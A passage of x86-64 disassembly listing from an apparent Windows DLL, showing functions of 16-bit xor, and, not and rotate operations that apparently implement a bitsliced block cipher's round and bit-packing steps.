   180001e1e:	66 41 33 fe          	xor    %r14w,%di
   180001e22:	66 41 89 40 04       	mov    %ax,0x4(%r8)
   180001e27:	66 41 33 fa          	xor    %r10w,%di
   180001e2b:	44 0f b7 f3          	movzwl %bx,%r14d
   180001e2f:	66 41 d3 ce          	ror    %cl,%r14w
   180001e33:	66 41 33 f9          	xor    %r9w,%di
   180001e37:	66 45 33 f7          	xor    %r15w,%r14w
   180001e3b:	66 41 89 78 06       	mov    %di,0x6(%r8)
   180001e40:	66 45 33 f2          	xor    %r10w,%r14w
   180001e44:	44 0f b7 fe          	movzwl %si,%r15d
   180001e48:	66 41 d3 cf          	ror    %cl,%r15w
   180001e4c:	66 45 33 f3          	xor    %r11w,%r14w
   180001e50:	66 45 33 fc          	xor    %r12w,%r15w
   180001e54:	66 45 89 70 08       	mov    %r14w,0x8(%r8)
   180001e59:	66 44 33 fb          	xor    %bx,%r15w
   180001e5d:	66 45 89 78 0a       	mov    %r15w,0xa(%r8)
   180001e62:	44 0f b7 2c 24       	movzwl (%rsp),%r13d
   180001e67:	44 0f b7 e5          	movzwl %bp,%r12d
   180001e6b:	0f b7 44 24 78       	movzwl 0x78(%rsp),%eax
   180001e70:	66 41 d3 cc          	ror    %cl,%r12w
   180001e74:	66 41 d3 ca          	ror    %cl,%r10w
   180001e78:	66 41 c1 c5 04       	rol    $0x4,%r13w
   180001e7d:	66 c1 c0 04          	rol    $0x4,%ax
   180001e81:	66 45 33 e5          	xor    %r13w,%r12w
   180001e85:	66 44 33 d0          	xor    %ax,%r10w
   180001e89:	66 44 33 e6          	xor    %si,%r12w
   180001e8d:	66 44 33 d5          	xor    %bp,%r10w
   180001e91:	66 45 89 60 0c       	mov    %r12w,0xc(%r8)
   180001e96:	83 7c 24 68 00       	cmpl   $0x0,0x68(%rsp)
   180001e9b:	66 45 89 50 0e       	mov    %r10w,0xe(%r8)
   180001ea0:	0f 84 ca 00 00 00    	je     0x180001f70
   180001ea6:	44 0f b7 5c 24 02    	movzwl 0x2(%rsp),%r11d
   180001eac:	41 0f b7 cc          	movzwl %r12w,%ecx
   180001eb0:	44 0f b7 4c 24 60    	movzwl 0x60(%rsp),%r9d
   180001eb6:	41 0f b7 d2          	movzwl %r10w,%edx
   180001eba:	0f b7 5c 24 70       	movzwl 0x70(%rsp),%ebx
   180001ebf:	66 c1 c1 08          	rol    $0x8,%cx
   180001ec3:	66 41 33 cc          	xor    %r12w,%cx
   180001ec7:	66 c1 c2 08          	rol    $0x8,%dx
   180001ecb:	66 41 33 d2          	xor    %r10w,%dx
   180001ecf:	0f b7 c1             	movzwl %cx,%eax
   180001ed2:	66 41 33 c3          	xor    %r11w,%ax
   180001ed6:	66 41 89 00          	mov    %ax,(%r8)
   180001eda:	0f b7 c2             	movzwl %dx,%eax
   180001edd:	66 33 c1             	xor    %cx,%ax
   180001ee0:	66 41 33 c1          	xor    %r9w,%ax
   180001ee4:	66 41 89 40 02       	mov    %ax,0x2(%r8)
   180001ee9:	41 0f b7 c3          	movzwl %r11w,%eax
   180001eed:	66 c1 c0 08          	rol    $0x8,%ax
   180001ef1:	66 33 c2             	xor    %dx,%ax
   180001ef4:	66 33 c3             	xor    %bx,%ax
   180001ef7:	66 41 33 c3          	xor    %r11w,%ax
   180001efb:	66 41 89 40 04       	mov    %ax,0x4(%r8)
   180001f00:	41 0f b7 c1          	movzwl %r9w,%eax
   180001f04:	66 c1 c0 08          	rol    $0x8,%ax
   180001f08:	66 33 c1             	xor    %cx,%ax
   180001f0b:	66 33 c7             	xor    %di,%ax
   180001f0e:	66 41 33 c1          	xor    %r9w,%ax
   180001f12:	66 41 89 40 06       	mov    %ax,0x6(%r8)
   180001f17:	0f b7 c3             	movzwl %bx,%eax
   180001f1a:	66 c1 c0 08          	rol    $0x8,%ax
   180001f1e:	66 33 c2             	xor    %dx,%ax
   180001f21:	66 33 c1             	xor    %cx,%ax
   180001f24:	66 41 33 c6          	xor    %r14w,%ax
   180001f28:	66 33 c3             	xor    %bx,%ax
   180001f2b:	66 41 89 40 08       	mov    %ax,0x8(%r8)
   180001f30:	0f b7 c7             	movzwl %di,%eax
   180001f33:	66 c1 c0 08          	rol    $0x8,%ax
   180001f37:	66 33 c2             	xor    %dx,%ax
   180001f3a:	66 41 33 c7          	xor    %r15w,%ax
   180001f3e:	66 33 c7             	xor    %di,%ax
   180001f41:	66 41 89 40 0a       	mov    %ax,0xa(%r8)
   180001f46:	41 0f b7 c6          	movzwl %r14w,%eax
   180001f4a:	66 c1 c0 08          	rol    $0x8,%ax
   180001f4e:	66 41 33 c4          	xor    %r12w,%ax
   180001f52:	66 41 33 c6          	xor    %r14w,%ax
   180001f56:	66 41 89 40 0c       	mov    %ax,0xc(%r8)
   180001f5b:	41 0f b7 c7          	movzwl %r15w,%eax
   180001f5f:	66 c1 c0 08          	rol    $0x8,%ax
   180001f63:	66 41 33 c2          	xor    %r10w,%ax
   180001f67:	66 41 33 c7          	xor    %r15w,%ax
   180001f6b:	66 41 89 40 0e       	mov    %ax,0xe(%r8)
   180001f70:	48 83 c4 18          	add    $0x18,%rsp
   180001f74:	41 5f                	pop    %r15
   180001f76:	41 5e                	pop    %r14
   180001f78:	41 5d                	pop    %r13
   180001f7a:	41 5c                	pop    %r12
   180001f7c:	5f                   	pop    %rdi
   180001f7d:	5e                   	pop    %rsi
   180001f7e:	5d                   	pop    %rbp
   180001f7f:	5b                   	pop    %rbx
   180001f80:	c3                   	ret
   180001f81:	cc                   	int3
   180001f82:	cc                   	int3
   180001f83:	cc                   	int3
   180001f84:	cc                   	int3
   180001f85:	cc                   	int3
   180001f86:	cc                   	int3
   180001f87:	cc                   	int3
   180001f88:	cc                   	int3
   180001f89:	cc                   	int3
   180001f8a:	cc                   	int3
   180001f8b:	cc                   	int3
   180001f8c:	cc                   	int3
   180001f8d:	cc                   	int3
   180001f8e:	cc                   	int3
   180001f8f:	cc                   	int3
   180001f90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001f95:	4c 8b d2             	mov    %rdx,%r10
   180001f98:	48 8b d9             	mov    %rcx,%rbx
   180001f9b:	45 33 c9             	xor    %r9d,%r9d
   180001f9e:	66 90                	xchg   %ax,%ax
   180001fa0:	41 8b c1             	mov    %r9d,%eax
   180001fa3:	41 bb 04 00 00 00    	mov    $0x4,%r11d
   180001fa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001fb0:	45 0f b7 42 0c       	movzwl 0xc(%r10),%r8d
   180001fb5:	0f b7 c8             	movzwl %ax,%ecx
   180001fb8:	41 0f b7 52 0e       	movzwl 0xe(%r10),%edx
   180001fbd:	83 c0 04             	add    $0x4,%eax
   180001fc0:	66 d3 ea             	shr    %cl,%dx
   180001fc3:	02 d2                	add    %dl,%dl
   180001fc5:	66 41 d3 e8          	shr    %cl,%r8w
   180001fc9:	41 80 e0 01          	and    $0x1,%r8b
   180001fcd:	44 0a c2             	or     %dl,%r8b
   180001fd0:	41 0f b7 52 0a       	movzwl 0xa(%r10),%edx
   180001fd5:	66 d3 ea             	shr    %cl,%dx
   180001fd8:	45 02 c0             	add    %r8b,%r8b
   180001fdb:	80 e2 01             	and    $0x1,%dl
   180001fde:	44 0a c2             	or     %dl,%r8b
   180001fe1:	41 0f b7 52 08       	movzwl 0x8(%r10),%edx
   180001fe6:	66 d3 ea             	shr    %cl,%dx
   180001fe9:	45 02 c0             	add    %r8b,%r8b
   180001fec:	80 e2 01             	and    $0x1,%dl
   180001fef:	44 0a c2             	or     %dl,%r8b
   180001ff2:	41 0f b7 52 06       	movzwl 0x6(%r10),%edx
   180001ff7:	66 d3 ea             	shr    %cl,%dx
   180001ffa:	45 02 c0             	add    %r8b,%r8b
   180001ffd:	80 e2 01             	and    $0x1,%dl
   180002000:	44 0a c2             	or     %dl,%r8b
   180002003:	41 0f b7 52 04       	movzwl 0x4(%r10),%edx
   180002008:	66 d3 ea             	shr    %cl,%dx
   18000200b:	45 02 c0             	add    %r8b,%r8b
   18000200e:	80 e2 01             	and    $0x1,%dl
   180002011:	44 0a c2             	or     %dl,%r8b
   180002014:	41 0f b7 52 02       	movzwl 0x2(%r10),%edx
   180002019:	66 d3 ea             	shr    %cl,%dx
   18000201c:	45 02 c0             	add    %r8b,%r8b
   18000201f:	80 e2 01             	and    $0x1,%dl
   180002022:	44 0a c2             	or     %dl,%r8b
   180002025:	41 0f b7 12          	movzwl (%r10),%edx
   180002029:	66 d3 ea             	shr    %cl,%dx
   18000202c:	45 02 c0             	add    %r8b,%r8b
   18000202f:	80 e2 01             	and    $0x1,%dl
   180002032:	44 0a c2             	or     %dl,%r8b
   180002035:	44 88 03             	mov    %r8b,(%rbx)
   180002038:	48 ff c3             	inc    %rbx
   18000203b:	49 83 eb 01          	sub    $0x1,%r11
   18000203f:	0f 85 6b ff ff ff    	jne    0x180001fb0
   180002045:	41 ff c1             	inc    %r9d
   180002048:	41 83 f9 04          	cmp    $0x4,%r9d
   18000204c:	0f 8c 4e ff ff ff    	jl     0x180001fa0
   180002052:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180002057:	c3                   	ret
   180002058:	cc                   	int3
   180002059:	cc                   	int3
   18000205a:	cc                   	int3
   18000205b:	cc                   	int3
   18000205c:	cc                   	int3
   18000205d:	cc                   	int3
   18000205e:	cc                   	int3
   18000205f:	cc                   	int3
   180002060:	89 54 24 10          	mov    %edx,0x10(%rsp)
   180002064:	53                   	push   %rbx
   180002065:	55                   	push   %rbp
   180002066:	56                   	push   %rsi
   180002067:	57                   	push   %rdi
   180002068:	41 54                	push   %r12
   18000206a:	41 55                	push   %r13
   18000206c:	41 56                	push   %r14
   18000206e:	41 57                	push   %r15
   180002070:	48 83 ec 28          	sub    $0x28,%rsp
   180002074:	44 0f b7 49 08       	movzwl 0x8(%rcx),%r9d
   180002079:	48 8b f9             	mov    %rcx,%rdi
   18000207c:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   180002080:	44 8b c2             	mov    %edx,%r8d
   180002083:	0f b7 51 0c          	movzwl 0xc(%rcx),%edx
   180002087:	45 0f b7 d9          	movzwl %r9w,%r11d
   18000208b:	0f b7 71 06          	movzwl 0x6(%rcx),%esi
   18000208f:	66 44 33 d8          	xor    %ax,%r11w
   180002093:	0f b7 1f             	movzwl (%rdi),%ebx
   180002096:	0f b7 69 04          	movzwl 0x4(%rcx),%ebp
   18000209a:	0f b7 49 02          	movzwl 0x2(%rcx),%ecx
   18000209e:	66 89 5c 24 12       	mov    %bx,0x12(%rsp)
   1800020a3:	66 44 89 5c 24 14    	mov    %r11w,0x14(%rsp)
   1800020a9:	45 85 c0             	test   %r8d,%r8d
   1800020ac:	0f 84 26 01 00 00    	je     0x1800021d8
   1800020b2:	45 0f b7 f1          	movzwl %r9w,%r14d
   1800020b6:	44 0f b7 d2          	movzwl %dx,%r10d
   1800020ba:	66 44 33 d0          	xor    %ax,%r10w
   1800020be:	66 44 33 f2          	xor    %dx,%r14w
   1800020c2:	44 0f b7 c6          	movzwl %si,%r8d
   1800020c6:	44 0f b7 e3          	movzwl %bx,%r12d
   1800020ca:	66 45 33 c1          	xor    %r9w,%r8w
   1800020ce:	66 44 33 e1          	xor    %cx,%r12w
   1800020d2:	0f b7 d3             	movzwl %bx,%edx
   1800020d5:	66 44 89 44 24 16    	mov    %r8w,0x16(%rsp)
   1800020db:	66 33 d6             	xor    %si,%dx
   1800020de:	66 41 f7 d2          	not    %r10w
   1800020e2:	66 f7 d2             	not    %dx
   1800020e5:	66 44 89 54 24 18    	mov    %r10w,0x18(%rsp)
   1800020eb:	44 0f b7 ea          	movzwl %dx,%r13d
   1800020ef:	66 89 94 24 80 00 00 	mov    %dx,0x80(%rsp)
   1800020f6:	00 
   1800020f7:	66 45 33 ea          	xor    %r10w,%r13w
   1800020fb:	66 41 f7 d6          	not    %r14w
   1800020ff:	45 0f b7 cc          	movzwl %r12w,%r9d
   180002103:	41 0f b7 c0          	movzwl %r8w,%eax
   180002107:	66 33 c3             	xor    %bx,%ax
   18000210a:	66 45 33 ce          	xor    %r14w,%r9w
   18000210e:	0f b7 5f 0a          	movzwl 0xa(%rdi),%ebx
   180002112:	66 f7 d0             	not    %ax
   180002115:	66 89 04 24          	mov    %ax,(%rsp)
   180002119:	45 0f b7 fb          	movzwl %r11w,%r15d
   18000211d:	66 44 33 7f 0c       	xor    0xc(%rdi),%r15w
   180002122:	41 0f b7 c4          	movzwl %r12w,%eax
   180002126:	66 41 33 c2          	xor    %r10w,%ax
   18000212a:	66 44 89 4c 24 0a    	mov    %r9w,0xa(%rsp)
   180002130:	66 89 44 24 10       	mov    %ax,0x10(%rsp)
   180002135:	66 44 33 cb          	xor    %bx,%r9w
   180002139:	66 41 f7 d7          	not    %r15w
   18000213d:	66 41 f7 d1          	not    %r9w
   180002141:	66 44 89 7c 24 02    	mov    %r15w,0x2(%rsp)
   180002147:	41 0f b7 c0          	movzwl %r8w,%eax
   18000214b:	66 33 c3             	xor    %bx,%ax
   18000214e:	66 44 89 4c 24 04    	mov    %r9w,0x4(%rsp)
   180002154:	66 f7 d0             	not    %ax
   180002157:	66 45 33 e0          	xor    %r8w,%r12w
   18000215b:	66 89 44 24 0e       	mov    %ax,0xe(%rsp)
   180002160:	0f b7 c1             	movzwl %cx,%eax
   180002163:	66 33 47 0c          	xor    0xc(%rdi),%ax
   180002167:	66 33 cd             	xor    %bp,%cx
   18000216a:	66 f7 d1             	not    %cx
   18000216d:	44 0f b7 c8          	movzwl %ax,%r9d
   180002171:	66 44 33 ca          	xor    %dx,%r9w
   180002175:	41 0f b7 d7          	movzwl %r15w,%edx
   180002179:	66 33 d6             	xor    %si,%dx
   18000217c:	44 0f b7 fd          	movzwl %bp,%r15d
   180002180:	66 33 77 0a          	xor    0xa(%rdi),%si
   180002184:	66 44 33 fb          	xor    %bx,%r15w
   180002188:	0f b7 e9             	movzwl %cx,%ebp
   18000218b:	66 89 54 24 08       	mov    %dx,0x8(%rsp)
   180002190:	66 41 33 cd          	xor    %r13w,%cx
   180002194:	66 41 f7 d7          	not    %r15w
   180002198:	66 41 33 e8          	xor    %r8w,%bp
   18000219c:	66 89 4c 24 70       	mov    %cx,0x70(%rsp)
   1800021a1:	41 0f b7 df          	movzwl %r15w,%ebx
   1800021a5:	66 f7 d6             	not    %si
   1800021a8:	66 33 5f 0e          	xor    0xe(%rdi),%bx
   1800021ac:	66 33 f0             	xor    %ax,%si
   1800021af:	0f b7 c5             	movzwl %bp,%eax
   1800021b2:	66 89 5c 24 12       	mov    %bx,0x12(%rsp)
   1800021b7:	66 41 33 c5          	xor    %r13w,%ax
   1800021bb:	66 45 33 fe          	xor    %r14w,%r15w
   1800021bf:	0f b7 ce             	movzwl %si,%ecx
   1800021c2:	66 89 44 24 06       	mov    %ax,0x6(%rsp)
   1800021c7:	66 41 33 cc          	xor    %r12w,%cx
   1800021cb:	66 89 8c 24 88 00 00 	mov    %cx,0x88(%rsp)
   1800021d2:	00 
   1800021d3:	e9 fa 00 00 00       	jmp    0x1800022d2
   1800021d8:	44 0f b7 6f 0a       	movzwl 0xa(%rdi),%r13d
   1800021dd:	45 0f b7 c3          	movzwl %r11w,%r8d
   1800021e1:	66 44 33 ea          	xor    %dx,%r13w
   1800021e5:	66 44 89 5c 24 16    	mov    %r11w,0x16(%rsp)
   1800021eb:	44 0f b7 d5          	movzwl %bp,%r10d
   1800021ef:	44 0f b7 dd          	movzwl %bp,%r11d
   1800021f3:	66 44 33 d0          	xor    %ax,%r10w
   1800021f7:	66 45 33 d9          	xor    %r9w,%r11w
   1800021fb:	66 44 89 5c 24 08    	mov    %r11w,0x8(%rsp)
   180002201:	45 0f b7 f5          	movzwl %r13w,%r14d
   180002205:	66 44 33 f3          	xor    %bx,%r14w
   180002209:	66 44 89 54 24 18    	mov    %r10w,0x18(%rsp)
   18000220f:	44 0f b7 e1          	movzwl %cx,%r12d
   180002213:	66 44 89 34 24       	mov    %r14w,(%rsp)
   180002218:	66 44 33 e0          	xor    %ax,%r12w
   18000221c:	0f b7 c1             	movzwl %cx,%eax
   18000221f:	66 33 c6             	xor    %si,%ax
   180002222:	66 45 33 dc          	xor    %r12w,%r11w
   180002226:	44 0f b7 f8          	movzwl %ax,%r15d
   18000222a:	66 44 89 5c 24 10    	mov    %r11w,0x10(%rsp)
   180002230:	66 45 33 f8          	xor    %r8w,%r15w
   180002234:	66 45 33 ef          	xor    %r15w,%r13w
   180002238:	41 0f b7 d7          	movzwl %r15w,%edx
   18000223c:	66 33 d3             	xor    %bx,%dx
   18000223f:	66 89 54 24 02       	mov    %dx,0x2(%rsp)
   180002244:	0f b7 d5             	movzwl %bp,%edx
   180002247:	66 33 57 0c          	xor    0xc(%rdi),%dx
   18000224b:	66 33 6f 0a          	xor    0xa(%rdi),%bp
   18000224f:	44 0f b7 da          	movzwl %dx,%r11d
   180002253:	66 33 d0             	xor    %ax,%dx
   180002256:	66 45 33 df          	xor    %r15w,%r11w
   18000225a:	66 89 54 24 06       	mov    %dx,0x6(%rsp)
   18000225f:	0f b7 f5             	movzwl %bp,%esi
   180002262:	66 33 f0             	xor    %ax,%si
   180002265:	66 44 89 5c 24 70    	mov    %r11w,0x70(%rsp)
   18000226b:	41 0f b7 c6          	movzwl %r14w,%eax
   18000226f:	0f b7 d6             	movzwl %si,%edx
   180002272:	66 41 33 c1          	xor    %r9w,%ax
   180002276:	66 41 33 d6          	xor    %r14w,%dx
   18000227a:	44 0f b7 c8          	movzwl %ax,%r9d
   18000227e:	66 89 44 24 0a       	mov    %ax,0xa(%rsp)
   180002283:	66 45 33 c8          	xor    %r8w,%r9w
   180002287:	66 89 54 24 04       	mov    %dx,0x4(%rsp)
   18000228c:	66 44 33 f1          	xor    %cx,%r14w
   180002290:	41 0f b7 c5          	movzwl %r13w,%eax
   180002294:	66 41 33 c2          	xor    %r10w,%ax
   180002298:	45 0f b7 da          	movzwl %r10w,%r11d
   18000229c:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   1800022a3:	00 
   1800022a4:	66 45 33 de          	xor    %r14w,%r11w
   1800022a8:	41 0f b7 c1          	movzwl %r9w,%eax
   1800022ac:	66 44 89 5c 24 14    	mov    %r11w,0x14(%rsp)
   1800022b2:	66 33 c2             	xor    %dx,%ax
   1800022b5:	66 89 44 24 0e       	mov    %ax,0xe(%rsp)
   1800022ba:	0f b7 c6             	movzwl %si,%eax
   1800022bd:	66 41 33 c4          	xor    %r12w,%ax
   1800022c1:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   1800022c8:	00 
   1800022c9:	66 41 33 e8          	xor    %r8w,%bp
   1800022cd:	0f b7 44 24 06       	movzwl 0x6(%rsp),%eax
   1800022d2:	66 23 5c 24 0a       	and    0xa(%rsp),%bx
   1800022d7:	66 41 23 c0          	and    %r8w,%ax
   1800022db:	66 44 89 4c 24 0c    	mov    %r9w,0xc(%rsp)
   1800022e1:	41 0f b7 d7          	movzwl %r15w,%edx
   1800022e5:	66 23 54 24 10       	and    0x10(%rsp),%dx
   1800022ea:	44 0f b7 ce          	movzwl %si,%r9d
   1800022ee:	66 45 23 cc          	and    %r12w,%r9w
   1800022f2:	45 0f b7 c5          	movzwl %r13w,%r8d
   1800022f6:	66 45 23 c2          	and    %r10w,%r8w
   1800022fa:	0f b7 cd             	movzwl %bp,%ecx
   1800022fd:	66 23 4c 24 08       	and    0x8(%rsp),%cx
   180002302:	66 44 33 c0          	xor    %ax,%r8w
   180002306:	44 0f b7 54 24 02    	movzwl 0x2(%rsp),%r10d
   18000230c:	66 33 c8             	xor    %ax,%cx
   18000230f:	66 45 23 d3          	and    %r11w,%r10w
   180002313:	66 41 33 d8          	xor    %r8w,%bx
   180002317:	44 0f b7 1c 24       	movzwl (%rsp),%r11d
   18000231c:	66 44 33 d1          	xor    %cx,%r10w
   180002320:	66 44 33 d2          	xor    %dx,%r10w
   180002324:	66 33 da             	xor    %dx,%bx
   180002327:	66 44 33 54 24 70    	xor    0x70(%rsp),%r10w
   18000232d:	66 45 23 de          	and    %r14w,%r11w
   180002331:	66 33 9c 24 80 00 00 	xor    0x80(%rsp),%bx
   180002338:	00 
   180002339:	66 44 33 d9          	xor    %cx,%r11w
   18000233d:	0f b7 54 24 0c       	movzwl 0xc(%rsp),%edx
   180002342:	66 45 33 d9          	xor    %r9w,%r11w
   180002346:	66 23 54 24 04       	and    0x4(%rsp),%dx
   18000234b:	0f b7 c3             	movzwl %bx,%eax
   18000234e:	66 44 33 9c 24 88 00 	xor    0x88(%rsp),%r11w
   180002355:	00 00 
   180002357:	66 41 33 c2          	xor    %r10w,%ax
   18000235b:	66 41 33 d0          	xor    %r8w,%dx
   18000235f:	41 0f b7 cb          	movzwl %r11w,%ecx
   180002363:	66 41 23 ca          	and    %r10w,%cx
   180002367:	66 41 33 d1          	xor    %r9w,%dx
   18000236b:	66 33 54 24 0e       	xor    0xe(%rsp),%dx
   180002370:	44 0f b7 c9          	movzwl %cx,%r9d
   180002374:	66 44 33 ca          	xor    %dx,%r9w
   180002378:	44 0f b7 c2          	movzwl %dx,%r8d
   18000237c:	66 45 23 c2          	and    %r10w,%r8w
   180002380:	66 44 23 c8          	and    %ax,%r9w
   180002384:	66 44 0b c3          	or     %bx,%r8w
   180002388:	0f b7 c1             	movzwl %cx,%eax
   18000238b:	66 44 33 c1          	xor    %cx,%r8w
   18000238f:	66 33 c3             	xor    %bx,%ax
   180002392:	66 45 33 c2          	xor    %r10w,%r8w
   180002396:	66 44 33 cb          	xor    %bx,%r9w
   18000239a:	44 0f b7 d2          	movzwl %dx,%r10d
   18000239e:	66 45 33 d3          	xor    %r11w,%r10w
   1800023a2:	66 44 23 d0          	and    %ax,%r10w
   1800023a6:	66 44 33 d2          	xor    %dx,%r10w
   1800023aa:	66 44 89 54 24 70    	mov    %r10w,0x70(%rsp)
   1800023b0:	45 0f b7 d3          	movzwl %r11w,%r10d
   1800023b4:	66 44 23 d3          	and    %bx,%r10w
   1800023b8:	41 0f b7 d8          	movzwl %r8w,%ebx
   1800023bc:	66 44 0b d2          	or     %dx,%r10w
   1800023c0:	66 41 33 d9          	xor    %r9w,%bx
   1800023c4:	66 44 33 d1          	xor    %cx,%r10w
   1800023c8:	66 45 33 d3          	xor    %r11w,%r10w
   1800023cc:	44 0f b7 5c 24 70    	movzwl 0x70(%rsp),%r11d
   1800023d2:	41 0f b7 c3          	movzwl %r11w,%eax
   1800023d6:	41 0f b7 ca          	movzwl %r10w,%ecx
   1800023da:	66 41 33 cb          	xor    %r11w,%cx
   1800023de:	66 41 33 c1          	xor    %r9w,%ax
   1800023e2:	66 44 23 5c 24 12    	and    0x12(%rsp),%r11w
   1800023e8:	41 0f b7 d2          	movzwl %r10w,%edx
   1800023ec:	66 41 33 d0          	xor    %r8w,%dx
   1800023f0:	66 89 8c 24 80 00 00 	mov    %cx,0x80(%rsp)
   1800023f7:	00 
   1800023f8:	66 89 94 24 88 00 00 	mov    %dx,0x88(%rsp)
   1800023ff:	00 
   180002400:	0f b7 c8             	movzwl %ax,%ecx
   180002403:	66 33 ca             	xor    %dx,%cx
   180002406:	66 44 89 5c 24 0e    	mov    %r11w,0xe(%rsp)
   18000240c:	0f b7 94 24 80 00 00 	movzwl 0x80(%rsp),%edx
   180002413:	00 
   180002414:	66 41 23 d7          	and    %r15w,%dx
   180002418:	45 0f b7 fa          	movzwl %r10w,%r15d
   18000241c:	66 44 23 7c 24 02    	and    0x2(%rsp),%r15w
   180002422:	66 44 89 7c 24 1c    	mov    %r15w,0x1c(%rsp)
   180002428:	44 0f b7 fb          	movzwl %bx,%r15d
   18000242c:	66 44 23 fe          	and    %si,%r15w
   180002430:	66 89 54 24 1a       	mov    %dx,0x1a(%rsp)
   180002435:	66 44 89 7c 24 02    	mov    %r15w,0x2(%rsp)
   18000243b:	41 0f b7 f0          	movzwl %r8w,%esi
   18000243f:	66 23 34 24          	and    (%rsp),%si
   180002443:	66 45 23 c6          	and    %r14w,%r8w
   180002447:	66 44 23 54 24 14    	and    0x14(%rsp),%r10w
   18000244d:	44 0f b7 f8          	movzwl %ax,%r15d
   180002451:	66 44 23 7c 24 06    	and    0x6(%rsp),%r15w
   180002457:	66 41 23 dc          	and    %r12w,%bx
   18000245b:	44 0f b7 b4 24 88 00 	movzwl 0x88(%rsp),%r14d
   180002462:	00 00 
   180002464:	66 23 44 24 16       	and    0x16(%rsp),%ax
   180002469:	66 44 23 74 24 18    	and    0x18(%rsp),%r14w
   18000246f:	66 44 21 4c 24 04    	and    %r9w,0x4(%rsp)
   180002475:	66 44 21 4c 24 0c    	and    %r9w,0xc(%rsp)
   18000247b:	66 44 89 3c 24       	mov    %r15w,(%rsp)
   180002480:	44 0f b7 f9          	movzwl %cx,%r15d
   180002484:	66 23 4c 24 08       	and    0x8(%rsp),%cx
   180002489:	66 44 23 fd          	and    %bp,%r15w
   18000248d:	0f b7 ac 24 88 00 00 	movzwl 0x88(%rsp),%ebp
   180002494:	00 
   180002495:	66 41 23 ed          	and    %r13w,%bp
   180002499:	66 44 89 7c 24 12    	mov    %r15w,0x12(%rsp)
   18000249f:	44 0f b7 ac 24 80 00 	movzwl 0x80(%rsp),%r13d
   1800024a6:	00 00 
   1800024a8:	66 44 23 6c 24 10    	and    0x10(%rsp),%r13w
   1800024ae:	44 0f b7 7c 24 02    	movzwl 0x2(%rsp),%r15d
   1800024b4:	66 89 6c 24 06       	mov    %bp,0x6(%rsp)
   1800024b9:	0f b7 6c 24 70       	movzwl 0x70(%rsp),%ebp
   1800024be:	66 23 6c 24 0a       	and    0xa(%rsp),%bp
   1800024c3:	83 7c 24 78 00       	cmpl   $0x0,0x78(%rsp)
   1800024c8:	66 89 74 24 1e       	mov    %si,0x1e(%rsp)
   1800024cd:	66 44 89 ac 24 80 00 	mov    %r13w,0x80(%rsp)
   1800024d4:	00 00 
   1800024d6:	66 44 89 54 24 10    	mov    %r10w,0x10(%rsp)
   1800024dc:	66 89 6c 24 70       	mov    %bp,0x70(%rsp)
   1800024e1:	66 89 5c 24 0a       	mov    %bx,0xa(%rsp)
   1800024e6:	66 44 89 44 24 14    	mov    %r8w,0x14(%rsp)
   1800024ec:	66 89 44 24 16       	mov    %ax,0x16(%rsp)
   1800024f1:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   1800024f6:	66 44 89 b4 24 88 00 	mov    %r14w,0x88(%rsp)
   1800024fd:	00 00 
   1800024ff:	0f 84 e6 00 00 00    	je     0x1800025eb
   180002505:	66 33 04 24          	xor    (%rsp),%ax
   180002509:	0f b7 d6             	movzwl %si,%edx
   18000250c:	66 33 54 24 1c       	xor    0x1c(%rsp),%dx
   180002511:	0f b7 e8             	movzwl %ax,%ebp
   180002514:	66 33 6c 24 14       	xor    0x14(%rsp),%bp
   180002519:	66 45 33 d3          	xor    %r11w,%r10w
   18000251d:	44 0f b7 5c 24 0c    	movzwl 0xc(%rsp),%r11d
   180002523:	66 33 eb             	xor    %bx,%bp
   180002526:	44 0f b7 44 24 04    	movzwl 0x4(%rsp),%r8d
   18000252c:	66 45 33 df          	xor    %r15w,%r11w
   180002530:	66 44 33 44 24 1a    	xor    0x1a(%rsp),%r8w
   180002536:	44 0f b7 fd          	movzwl %bp,%r15d
   18000253a:	66 45 33 f5          	xor    %r13w,%r14w
   18000253e:	0f b7 f5             	movzwl %bp,%esi
   180002541:	66 33 74 24 12       	xor    0x12(%rsp),%si
   180002546:	44 0f b7 c9          	movzwl %cx,%r9d
   18000254a:	66 33 74 24 1e       	xor    0x1e(%rsp),%si
   18000254f:	66 41 33 e8          	xor    %r8w,%bp
   180002553:	66 44 33 4c 24 06    	xor    0x6(%rsp),%r9w
   180002559:	66 33 ea             	xor    %dx,%bp
   18000255c:	66 45 33 f9          	xor    %r9w,%r15w
   180002560:	0f b7 da             	movzwl %dx,%ebx
   180002563:	66 33 d8             	xor    %ax,%bx
   180002566:	41 0f b7 ca          	movzwl %r10w,%ecx
   18000256a:	66 33 4c 24 70       	xor    0x70(%rsp),%cx
   18000256f:	41 0f b7 c7          	movzwl %r15w,%eax
   180002573:	66 33 44 24 04       	xor    0x4(%rsp),%ax
   180002578:	66 41 33 e9          	xor    %r9w,%bp
   18000257c:	66 33 44 24 02       	xor    0x2(%rsp),%ax
   180002581:	66 44 33 7c 24 0e    	xor    0xe(%rsp),%r15w
   180002587:	66 44 33 7c 24 1a    	xor    0x1a(%rsp),%r15w
   18000258d:	66 89 47 0e          	mov    %ax,0xe(%rdi)
   180002591:	0f b7 c3             	movzwl %bx,%eax
   180002594:	66 41 33 c6          	xor    %r14w,%ax
   180002598:	66 33 d9             	xor    %cx,%bx
   18000259b:	66 44 33 74 24 16    	xor    0x16(%rsp),%r14w
   1800025a1:	66 41 33 c3          	xor    %r11w,%ax
   1800025a5:	66 44 33 74 24 70    	xor    0x70(%rsp),%r14w
   1800025ab:	66 41 33 c2          	xor    %r10w,%ax
   1800025af:	66 33 44 24 14       	xor    0x14(%rsp),%ax
   1800025b4:	66 41 33 db          	xor    %r11w,%bx
   1800025b8:	66 33 44 24 06       	xor    0x6(%rsp),%ax
   1800025bd:	66 41 33 d9          	xor    %r9w,%bx
   1800025c1:	66 89 47 0c          	mov    %ax,0xc(%rdi)
   1800025c5:	0f b7 c6             	movzwl %si,%eax
   1800025c8:	66 33 44 24 08       	xor    0x8(%rsp),%ax
   1800025cd:	66 33 f1             	xor    %cx,%si
   1800025d0:	66 33 44 24 02       	xor    0x2(%rsp),%ax
   1800025d5:	66 41 33 f0          	xor    %r8w,%si
   1800025d9:	66 33 b4 24 88 00 00 	xor    0x88(%rsp),%si
   1800025e0:	00 
